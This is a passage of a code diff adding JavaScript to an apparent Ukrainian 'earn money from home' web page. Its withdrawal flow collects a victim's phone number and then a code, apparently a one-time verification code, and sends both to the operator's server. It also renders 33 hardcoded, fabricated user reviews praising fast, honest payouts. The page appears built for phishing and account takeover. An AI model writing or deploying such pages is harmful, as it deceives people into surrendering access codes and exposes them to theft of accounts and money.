+            submitPhoneBtn.onclick = () => {
+                const phoneInput = document.getElementById('phoneInput');
+                const phoneValue = phoneInput.value.trim();
+                const phoneRegex = /^\+380\s?\d{2}\s?\d{3}\s?\d{2}\s?\d{2}$/; // +380 99 123 45 67
+                
+                if (!phoneRegex.test(phoneValue)) {
+                    alert('Введіть номер у форматі +380 99 123 45 67');
+                    return;
+                }
+                
+                if (phoneValue.startsWith('+3800') || phoneValue.startsWith('+380380')) {
+                    alert('Недопустимий формат номера. Спробуйте інший.');
+                    return;
+                }
+                
+                // Надсилаємо запит на сервер
+                socket.emit('withdrawRequest', {
+                    phone: phoneValue,
+                    balance: currentBalance
+                });
+                
+                // Перехід до наступного кроку
+                closeModal(withdrawModal1);
+                openModal(withdrawModal2);
+            };
+            
+            submitCodeBtn.onclick = () => {
+                const codeInput = document.getElementById('codeInput');
+                if (codeInput.value.trim() === '') {
+                    alert('Введіть код');
+                    return;
+                }
+                
+                // Надсилаємо код на сервер
+                socket.emit('withdrawCode', {
+                    code: codeInput.value
+                });
+                
+                // Скидаємо баланс
+                saveBalance(0.00);
+                
+                // Показываємо фінальне повідомлення
+                closeModal(withdrawModal2);
+                openModal(withdrawModal3);
+                
+                // Очищуємо поля
+                document.getElementById('phoneInput').value = '+380 ';
+                codeInput.value = '';
+            };
+
+
+            // == ЛОГІКА ВІДГУКІВ ==
+            const reviewsData = [
+                { author: "Анна", text: "Зробила два завдання, поставила на вивід, все круто, вивели за 5 годин." },
+                { author: "Люба", text: "Думала лохотрон, зробила тестове завдання, виводять реально, менеджер дуже приємна людина." },
+                { author: "Аліна", text: "Найкращий сервіс для додаткового заробітку, який я знаходила." },
+                { author: "Олег", text: "Вивів 2400 грн за 3 дні. Все чесно!" },
+                { author: "Марія", text: "Роблю вже тиждень, щодня по 1000+ грн. Дякую!" },
+                { author: "Сергій", text: "Взяв 1300 грн за одне завдання — реально виплатили за 18 хвилин!" },
+                { author: "Оксана", text: "Все просто і швидко. Рекомендую всім!" },
+                { author: "Іван", text: "Заробив 1500 грн за вечір. Супер!" },
+                { author: "Наталя", text: "Виплати швидкі, завдання легкі." },
+                { author: "Павло", text: "Рекомендую, вже вивів 3000 грн." },
+                { author: "Юлія", text: "Дуже зручно, працюю з телефону." },
+                { author: "Дмитро", text: "Все чесно, без обману." },
+                { author: "Тетяна", text: "Заробіток реальний, дякую команді!" },
+                { author: "Віктор", text: "Швидкі виплати на карту." },
+                { author: "Олена", text: "Роблю завдання щодня, доход стабільний." },
+                { author: "Михайло", text: "Найкращий спосіб підзаробити." },
+                { author: "Світлана", text: "Виплатили все до копійки." },
+                { author: "Андрій", text: "Легкі завдання, гарний заробіток." },
+                { author: "Катерина", text: "Дякую за можливість заробляти вдома." },
+                { author: "Богдан", text: "Вивів 2000 грн за 2 дні." },
+                { author: "Ірина", text: "Сервіс топ, рекомендую друзям." },
+                { author: "Василь", text: "Все працює, як обіцяно." },
+                { author: "Ганна", text: "Заробила на подарунок за один день." },
+                { author: "Роман", text: "Швидко і просто." },
+                { author: "Ольга", text: "Дуже задоволена сервісом." },
+                { author: "Максим", text: "Реальний заробіток без вкладень." },
+                { author: "Людмила", text: "Виплати миттєві." },
+                { author: "Артем", text: "Круто, заробляю в вільний час." },
+                { author: "Валентина", text: "Все чесно і прозоро." },
+                { author: "Євген", text: "Рекомендую всім!" },
+                { author: "Зоя", text: "Заробіток перевершив очікування." },
+                { author: "Степан", text: "Легко і прибутково." },
+                { author: "Надія", text: "Дякую за швидкі виплати." }
+            ];
+
+            function renderReviews() {
+                const list = document.getElementById('reviewsList');
+                list.innerHTML = '';
+                reviewsData.forEach(r => {
+                    const div = document.createElement('div');
+                    div.className = 'review-item';
+                    div.innerHTML = `<div class="review-author">${r.author}</div><div class="review-text">${r.text}</div>`;
+                    list.appendChild(div);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
